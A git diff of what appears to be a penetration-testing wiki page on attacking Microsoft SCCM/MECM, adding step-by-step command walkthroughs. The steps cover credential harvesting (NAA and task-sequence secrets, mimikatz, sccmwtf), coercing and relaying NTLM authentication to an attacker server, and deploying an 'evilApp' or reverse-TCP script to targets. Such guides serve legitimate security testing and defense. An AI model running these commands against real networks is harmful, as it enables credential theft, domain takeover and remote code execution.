@@ -2,7 +2,9 @@
 
 ## Theory
 
-The **System Center Configuration Manager** (SCCM), now known as **Microsoft Endpoint Configuration Manager** (MECM), is a software developed by Microsoft to help system administrators manage the servers and workstations in large Active Directory environments. It provides lots of features including remote control, patch management, task automation, application distribution, hardware and software inventory, compliance management and security policy administration.
+The **System Center Configuration Manager** (SCCM), now (since 2020) known as **Microsoft Endpoint Configuration Manager** (MECM), is a software developed by Microsoft to help system administrators manage the servers and workstations in large Active Directory environments. It provides lots of features including remote control, patch management, task automation, application distribution, hardware and software inventory, compliance management and security policy administration.
+
+SCCM is an **on-premise** solution, but Microsoft also maintains a cloud-native client management suite named **Intune**. Both Intune and SCCM are part of the "**Microsoft Endpoint Manager**"  umbrella.
 
 ### Topology
 
@@ -57,7 +59,167 @@ _Nota bene, there is a_ [_feature_](https://learn.microsoft.com/en-us/mem/config
 
 ## Practice
 
-### Client push installation
+### Attack path overview
+
+<figure><img src="../../.gitbook/assets/SCCM-Attack-Surface-Overview.png" alt=""><figcaption><p>SCCM Attack Surface Overview</p></figcaption></figure>
+
+### Recon
+
+Enumerate whether SCCM is present in a target network&#x20;
+
+{% tabs %}
+{% tab title="Windows" %}
+Using LDAP queries from a **domain-joined** Windows machine
+
+```powershell
+## LDAP search via PS
+PS C:\> ([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}
+```
+
+<figure><img src="../../.gitbook/assets/SCCM_Recon_ADSI.png" alt=""><figcaption></figcaption></figure>
+
+Using WMI queries or [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) to query a clients local WMI database
+
+```powershell
+## WMI
+PS C:\> Get-WmiObject -Class SMS_Authority -Namespace root\CCM
+## SharmSCCP
+PS C:\> .\SharpSCCM.exe local site-info
+```
+
+<figure><img src="../../.gitbook/assets/SCCM_Recon_WMI-SharpSCCM.png" alt=""><figcaption></figcaption></figure>
+{% endtab %}
+
+{% tab title="Linux" %}
+[pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy), which is based on [PXEThief](https://github.com/MWR-CyberSec/PXEThief), can be used to query for PXE boot media:
+
+<figure><img src="../../.gitbook/assets/SCCM_Recon_Linux_pxethiefy.png" alt=""><figcaption></figcaption></figure>
+
+There are a few things to note here:
+
+* [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) uses broadcast requests to request DHCP PXE boot options. An SCCM setup does not have to support PXE boot and a found PXE server does not have to be an SCCM component. Be cautios of false positive results.
+* In this case a PXE server was found and PXE media was downloaded. The location of the PXE media on the TFTP server is `\SMSTemp\...`, which indicates that this is indeed an SCCM server.
+{% endtab %}
+{% endtabs %}
+
+### Privilege Escalation
+
+Currently there are two different path ways for privilege escalation routes in an SCCM environment:
+
+* Credential harvesting
+* Authentication Coercion
+
+#### Credential harvesting
+
+The following SCCM components can contain credentials:
+
+* Device Collection variables
+* TaskSequence variables
+* Network Access Accounts (NAAs)
+* Client Push Accounts
+* Application & Scripts (potentially)
+
+Find more details about these components in [this blog](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) post.
+
+{% tabs %}
+{% tab title="From Windows" %}
+**Harvest NAA credentials**
+
+```powershell
+# Locally
+## Locally From WMI
+PS:> Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
+## Extracting from CIM store
+PS:> .\SharpSCCM.exe local secretes disk
+## Extracting from WMI
+PS:> .\SharpSCCM.exe local secretes wmi
+## Using SharpDPAPI
+PS:> .\SharpDPAPI.exe SCCM
+## Using mimikatz
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # dpapi::sccm
+
+# Remotely from policy
+PS:> .\SharpSCCM.exe get secretes
+```
+
+**Harvest TaskSequence variables**
+
+```powershell
+# Locally
+## Locally from WMI 
+PS:> Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
+## Extracting from CIM store
+PS:> .\SharpSCCM.exe local secrets -m disk
+## Extracting from WMI
+PS:> .\SharpSCCM.exe local secrets -m wmi
+
+# Remotely from policy
+PS:> .\SharpSCCM.exe get secrets
+```
+
+**Harvest Device Collection variables**
+
+```powershell
+# Locally if device has been assigned Collection variables
+## Locally from WMI 
+PS:> Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
+## Locally from CIM store
+PS:> .\SharpSCCM.exe local secrets -m disk
+## Locally from WMI
+PS:> .\SharpSCCM.exe local secrets -m wmi
+```
+
+<figure><img src="../../.gitbook/assets/SharpSCCM-get-secrets-command.png" alt=""><figcaption></figcaption></figure>
+{% endtab %}
+
+{% tab title="From Linux" %}
+From UNIX-like systems, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher the WMI blob via DPAPI and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
+
+```powershell
+SystemDPAPIdump.py -creds -sccm 'DOMAIN/USER:Password'@'target.domain.local'
+```
+
+**Harvest NAA credentntials**
+
+{% hint style="warning" %}
+The tool author ([Adam Chester](https://twitter.com/\_xpn\_)) warns not to use this script in production environments.
+{% endhint %}
+
+Step 1: Gain control over computer account password
+
+```bash
+$:> python3 impacket/examples/addcomputer.py -dc-ip 10.250.2.200 -computer-name addedcomp1 -computer-pass Ndjqje8341 SafeAlliance.local/Frank.Zapper:b                                                                                               
+Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+
+[*] Successfully added machine account addedcomp1$ with password Ndjqje8341.
+```
+
+Step 2: Use sccmwtf.py to extract NAA secrets
+
+```bash
+$:> python3 sccmwtf.py <CompAccountNetBiosName> <CompAccountFQDN> <SCCMMPNetBiosName> "<Domain>\<CompAccountName>$" "<CompAccountPassword>"
+## Example
+$:> python3 sccmwtf.py addedcomp1 addedcomp1.SafeAlliance.local SA-SCCM-1 "SafeAlliance\addedcomp1$" "Ndjqje8341"
+```
+
+Step 3: Obtain obfuscated NAA secrets
+
+The obufscated NAA secrets will be saved in a local file
+
+```bash
+$:> cat /tmp/naapolicy.xml
+```
+
+Step 4: Decode obfuscated strings
+
+To decode username and password use `.\DeobfuscateSecretString.exe` contained in [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) or [sccmwtf](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c)
+{% endtab %}
+{% endtabs %}
+
+#### Authentication Coercion via Client Push Installation
 
 With a compromised machine in an Active Directory where SCCM is deployed via **Client Push Accounts** on the assets, it is possible to have the "Client Push Account" authenticate to a remote resource and, for instance, retrieve an NTLM response (i.e. [NTLM capture](ntlm/capture.md)). The "Client Push Account" usually has local administrator rights to a lot of assets.
 
@@ -65,26 +227,143 @@ With a compromised machine in an Active Directory where SCCM is deployed via **C
 In some case, the "Client Push Accounts"  could even be part of the Domain Admins group, leading to a complete takeover of the domain.
 {% endhint %}
 
-In order to retrieve the Client Push Account's authentication, all local admins must be removed from the compromised host, and a listener can be started on it with [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (C# or Powershell).
+The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.
+
+**Option 1: Wait for Client Push Installation**
 
 ```powershell
-# 1. Remove all the local Administrators on the compromised machine
-net user <username> /delete
-
-# 2. Listen for authentication with Inveigh
-.\Inveigh.exe -Challenge 1122334455667788
+## Credential capture using Inveigh 
+PS:> .\Inveigh.exe
 ```
 
-Once the capturing/relaying listeners are started, the tester can wait for the Client Push Accounts to authenticate automatically. Hopefully, NTLMv1 will be used, allowing for easier NTLM cracking. There are other alternatives to cracking the response, like [relaying the authentication](ntlm/relay.md).
+**Option 2: Forcefully "coerce" the Client Push Installation**
 
-### Applications and scripts deployment
+{% hint style="danger" %}
+Important note: You want to read [this blog](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) post before you continue this route, as this attack might leave traces behind and might junk up the SCCM environment.
+{% endhint %}
 
-With sufficient rights on the central SCCM server (sufficient rights on WMI), it is possible to deploy applications or scripts on the Active Directory machines with [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM) (Powershell).
+**Step 1: Prepare coercion receiver**&#x20;
+
+Note that you could either capture & crack received credentials or relay them to a suitable target system (or both).
+
+```sh
+# On Linux
+## Relay using ntlmrelayx.py
+$:> python3 examples/ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
+# On Windows
+## Credential capture using Inveigh 
+PS:> .\Inveigh.exe
+```
+
+**Step 2: Trigger Client-Push Installation**
+
+```PowerShell
+## If admin access over Management Point (MP)
+PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
+## If not MP admin
+PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer>
+```
+
+**Step 3: Cleanup**&#x20;
+
+If you run the above SharpSCCM command with the `--as-admin` parameter (cause you have admin privileges over the MP), there's nothing to do. Otherwise get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t <AttackerServer>` parameter. This is the device name that will appear in SCCM.
+
+### Lateral Movement
+
+#### Admin & Special Account Enumeration
+
+This step requires administrative privileges over the SCCM Management Point (MP) in order to query the MP's WMI database.
+
+{% tabs %}
+{% tab title="Windows" %}
+**Admin Users**
 
 ```powershell
-# Create a SCCM Session via WMI with the Site Code
-Find-SccmSiteCode -ComputerName SCCMServer
-New-SccmSession -ComputerName SCCMServer -SiteCode <site_code> -ConnectionType WMI
+PS:> .\SharpSCCM.exe get class-instances SMS_ADMIN
+```
+
+**Special Accounts**
+
+```powershell
+PS:> .\SharpSCCM.exe get class-instances SMS_SCI_Reserved
+```
+
+<div>
+
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_User_Enum.png" alt=""><figcaption><p>Admin user enumeration in SCCM</p></figcaption></figure>
+
+ 
+
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Special_Account_Enum.png" alt=""><figcaption><p>Special Account Enumeration in SCCM</p></figcaption></figure>
+
+</div>
+{% endtab %}
+{% endtabs %}
+
+#### Applications and scripts deployment
+
+{% tabs %}
+{% tab title="SharpSCCM" %}
+References:
+
+* [https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
+
+**Step 1: Confirm Access permissions**
+
+```powershell
+PS:> .\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
+```
+
+**Step 2: Find target device**
+
+```powershell
+## Search for device of user "Frank.Zapper"
+PS:> .\SharpSCCM.exe get primary-users -u Frank.Zapper
+
+## List all active SCCM devices where the SCCM client is installed 
+### CAUTION: This could be huge
+PS:> .\SharpSCCM.exe get devices -w "Active=1 and Client=1"
+```
+
+**Step 3: Deploy Application to target device**
+
+In this final step you can chose to either create an actual application to deploy to the target machine or just trigger an install from a remote UNC path in order to capture and relay an incoming NTLM authentication. Note the following:
+
+* Coercing an authentication might be stealthier (and requires less cleanup) than installing an application
+* To capture and relay NTLM credentials, the target device must support NTLM (very likely).
+* The neat part: The Authentication can be coerced using the primary user account of the device OR the device computer account (you can choose)
+
+```bash
+## Prep capturing server
+## ntlmrelayx targeting 10.250.2.179
+$:> sudo python3 ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
+## Also keep Pcredz running, just in case
+$:> sudo python3 ./Pcredz -i enp0s8 -t
+
+
+## Run attack
+PS:>.\SharpSCCM.exe exec -rid <TargetResourceID> -r <AttackerHost>
+```
+
+Note that the incoming authentication requsts might take a while (couple minutes) to roll in...
+
+<div>
+
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Trigger_Deployment.png" alt=""><figcaption></figcaption></figure>
+
+ 
+
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Capture_Authentication.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+{% endtab %}
+
+{% tab title="PowerSCCM" %}
+With sufficient rights on the central SCCM server (sufficient rights on WMI), it is possible to deploy applications or scripts on the Active Directory machines with [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM) (Powershell).
+
+<pre class="language-powershell"><code class="lang-powershell"><strong># Create a SCCM Session via WMI with the Site Code
+</strong>Find-SccmSiteCode -ComputerName SCCMServer
+New-SccmSession -ComputerName SCCMServer -SiteCode &#x3C;site_code> -ConnectionType WMI
 
 # Retrieve the computers linked to the SCCM server
 Get-SccmSession | Get-SccmComputer
@@ -96,14 +375,14 @@ Get-SccmSession | New-SccmCollection -CollectionName "collection" -CollectionTyp
 Get-SccmSession | Add-SccmDeviceToCollection -ComputerNameToAdd "target" -CollectionName "collection"
 
 # Create an application to deploy
-Get-SccmSession | New-SccmApplication -ApplicationName "evilApp" -PowerShellB64 "<powershell_script_in_Base64>"
+Get-SccmSession | New-SccmApplication -ApplicationName "evilApp" -PowerShellB64 "&#x3C;powershell_script_in_Base64>"
 
 # Create an application deployment with the application and the collection previously created
 Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "evilApp" -AssignmentName "assig" -CollectionName "collection"
 
 # Force the machine in the collection to check the application update (and force the install)
 Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "collection"
-```
+</code></pre>
 
 If deploying applications fails, deploying CMScripts is an alternative, which requires a "Configuration Manager" drive on the SCCM server.&#x20;
 
@@ -113,92 +392,8 @@ This [pull request](https://github.com/PowerShellMafia/PowerSCCM/pull/6) on Powe
 # Create a CM drive if it doesn't already exist and deploy a CMScript on a target
 New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.domain.local' -TargetDevice 'target' -Path '.\reverseTCP.ps1' -ScriptName 'evilScript'
 ```
-
-### SCCM credentials extraction with DPAPI
-
-When non-domain joined computers need to retrieve software from a SCCM server, the SCCM endpoint will deploy **Network Access Accounts (NAA)** on them. The NAAs do nothing on the hosts but access resources across the network.
-
-{% hint style="info" %}
-Normally, the NAA account [should](https://docs.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#network-access-account) be configured with the least privilege and does not have interactive logon rights. But it appears that sometimes domain accounts are used for this task.
-{% endhint %}
-
-The NAA policy, including the NAA's credentials, is sent by the SCCM server and stored on the client machine, encrypted via DPAPI with SYSTEM's master key. With a SYSTEM (i.e. local admin) access on the target, it is possible to decipher the policy and retrieve the credentials.
-
-{% hint style="info" %}
-It appears that even after changing the NAA account or uninstalling the SCCM client, the credentials are still present on the disk.
-{% endhint %}
-
-{% tabs %}
-{% tab title="UNIX-like" %}
-From UNIX-like systems, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher the WMI blob via DPAPI and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
-
-```bash
-SystemDPAPIdump.py -creds -sccm 'DOMAIN/USER:Password'@'target.domain.local'
-```
-{% endtab %}
-
-{% tab title="Windows" %}
-With an elevated session on the target machine, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (C#) can be used to extract the SCCM credentials on the host.
-
-```powershell
-.\SharpDPAPI.exe SCCM
-```
-
-The tool [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can also be used for the same purpose with [`privilege::debug`](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) , [`token::elevate`](https://tools.thehacker.recipes/mimikatz/modules/token/elevate) and [`dpapi::sccm`](https://tools.thehacker.recipes/mimikatz/modules/dpapi/sccm).
-
-```batch
-.\mimikatz.exe
-mimikatz # privilege::debug
-mimikatz # token::elevate
-mimikatz # dpapi::sccm
-```
 {% endtab %}
 {% endtabs %}
-
-### Network Access Account de-obfuscation
-
-A computer account has the ability to register itself with the SCCM server and request the encrypted NAA policies, decrypt them, de-obfuscate them and retrieve the NAA's (Network Access Account) credentials in them.
-
-{% hint style="info" %}
-Normally, the NAA account [should](https://docs.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#network-access-account) be configured with the least privilege and does not have interactive logon rights. But it appears that sometimes domain accounts are used for this task.
-{% endhint %}
-
-The first step consists in controlling a computer account. One can be [created](domain-settings/machineaccountquota.md#create-a-computer-account) if the [Machine Account Quota](domain-settings/machineaccountquota.md) attribute is greater than 0.
-
-{% content-ref url="domain-settings/machineaccountquota.md" %}
-[machineaccountquota.md](domain-settings/machineaccountquota.md)
-{% endcontent-ref %}
-
-#### 1. Enroll and retrieve the NAA policy
-
-The attack can then be performed with [sccmwtf](https://github.com/xpn/sccmwtf) (Python). The new client to spoof doesn't need to be the previously created computer account (useful if the attacker already controls an enrolled existing computer account).
-
-The positional arguments are as follows:
-
-* Spoof Name&#x20;
-* Spoof FQDN&#x20;
-* Target SCCM&#x20;
-* Computer account username&#x20;
-* Computer account password
-
-{% code overflow="wrap" %}
-```bash
-sccmwtf.py "fakepc" "fakepc.domain.local" 'SCCM-Server' 'DOMAIN\ControlledComputer$' 'Password123!'
-```
-{% endcode %}
-
-{% hint style="warning" %}
-The tool author ([Adam Chester](https://twitter.com/\_xpn\_)) warns not to use this script in production environments.
-{% endhint %}
-
-#### 2. Retrieve the credentials
-
-Then, on a Windows machine, the two blobs (`NetworkAccessUsername` and `NetworkAccessPassword`) can be retrieved in plaintext by indicating only the hexadecimal part.
-
-```powershell
-.\policysecretunobfuscate.exe <blob_hex_1>
-.\policysecretunobfuscate.exe <blob_hex_2>
-```
 
 ### SCCM Site Takeover
 
@@ -365,6 +560,8 @@ The tool author ([Chris Thompson](https://mobile.twitter.com/\_mayyhem)) warns t
 {% endhint %}
 
 ## Resources
+
+{% embed url="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/" %}
 
 {% embed url="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts" %}
 
